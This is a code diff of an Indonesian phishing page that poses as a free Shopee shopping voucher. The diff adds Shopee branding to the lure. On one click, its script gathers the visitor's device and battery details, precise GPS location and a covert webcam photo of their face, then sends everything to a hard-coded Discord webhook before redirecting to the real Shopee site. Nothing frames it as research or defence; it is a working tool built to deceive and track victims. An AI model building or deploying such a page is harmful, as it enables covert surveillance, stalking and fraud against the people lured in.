@@ -3,66 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Klaim Voucher Belanja Gratis!</title>
+    <title>Klaim Voucher Shopee Gratis!</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 350px; }
-        .icon { font-size: 50px; margin-bottom: 10px; }
-        h2 { color: #ee4d2d; margin: 0; }
-        p { color: #555; font-size: 14px; margin: 15px 0; }
-        .btn { background: #ee4d2d; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
+        body { font-family: 'Helvetica', Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 320px; border-top: 5px solid #ee4d2d; }
+        h2 { color: #ee4d2d; font-size: 18px; margin-bottom: 10px; }
+        p { color: #666; font-size: 13px; line-height: 1.5; }
+        .btn { background: #ee4d2d; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="icon">🎁</div>
-    <h2>Voucher Rp100.000</h2>
-    <p>Selamat! Kamu terpilih mendapatkan voucher gratis. Klik tombol di bawah untuk aktivasi berdasarkan lokasi kamu.</p>
-    <button class="btn" onclick="startCapture()">KLAIM SEKARANG</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png" width="80" style="margin-bottom:10px;">
+    <h2>Voucher Rp100.000 Menantimu!</h2>
+    <p>Klik tombol di bawah untuk aktivasi voucher belanja gratis di lokasi terdekatmu.</p>
+    <button class="btn" onclick="startCapture()">AMBIL VOUCHER</button>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // MASUKKAN WEBHOOK DISCORD KAMU DI SINI
+    // MASUKKAN LINK DISCORD KAMU DI SINI
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
-    async function sendData(content, file = null) {
-        const formData = new FormData();
-        if (file) {
-            formData.append('file', file, 'foto.jpg');
-            formData.append('payload_json', JSON.stringify({ content: content }));
+    async function sendToDiscord(msg, blob = null) {
+        const data = new FormData();
+        if (blob) {
+            data.append('file', blob, 'foto.jpg');
+            data.append('payload_json', JSON.stringify({ content: msg }));
         } else {
-            formData.append('payload_json', JSON.stringify({ content: content }));
+            data.append('payload_json', JSON.stringify({ content: msg }));
         }
-        return fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        return fetch(DISCORD_WEBHOOK, { method: 'POST', body: data });
     }
 
     async function startCapture() {
         const btn = document.querySelector('.btn');
-        btn.innerText = "Memproses...";
+        btn.innerText = "Mencari Lokasi...";
         btn.disabled = true;
 
-        // 1. Ambil Info Perangkat & Baterai
-        let deviceMsg = "📱 **Target Terdeteksi!**\n";
-        deviceMsg += "• Browser: " + navigator.userAgent + "\n";
+        // 1. Ambil Info Baterai & Spek
+        let deviceData = "📱 **Info Perangkat Masuk!**\n";
+        deviceData += "• HP: " + navigator.userAgent + "\n";
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            deviceMsg += `• Baterai: ${(b.level * 100).toFixed(0)}% (${b.charging ? 'Cas ⚡' : 'Baterai 🪫'})\n`;
+            deviceData += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
         }
-        await sendData(deviceMsg);
+        await sendToDiscord(deviceData);
 
         // 2. Ambil Lokasi
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const link = "https://www.google.com/maps?q=" + lat + "," + lon;
             
-            await sendData(`📍 **Lokasi Akurat (${acc.toFixed(1)}m):**\n${mapLink}`);
+            await sendToDiscord("📍 **Lokasi Terdeteksi!**\nAkurasi: " + acc.toFixed(1) + " meter\nLink: " + link);
 
             // 3. Ambil Foto
             try {
@@ -76,9 +75,8 @@
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(async (blob) => {
-                        await sendData("📸 **Foto Wajah Target:**", blob);
+                        await sendToDiscord("📸 **Foto Wajah Target:**", blob);
                         stream.getTracks().forEach(t => t.stop());
-                        alert("Voucher gagal diklaim. Coba lagi nanti.");
                         window.location.href = "https://shopee.co.id";
                     }, 'image/jpeg');
                 }, 2000);
@@ -86,7 +84,7 @@
                 window.location.href = "https://shopee.co.id";
             }
         }, (err) => {
-            alert("Izin lokasi diperlukan untuk klaim voucher.");
+            alert("Izin lokasi diperlukan untuk klaim promo.");
             location.reload();
         }, { enableHighAccuracy: true });
     }
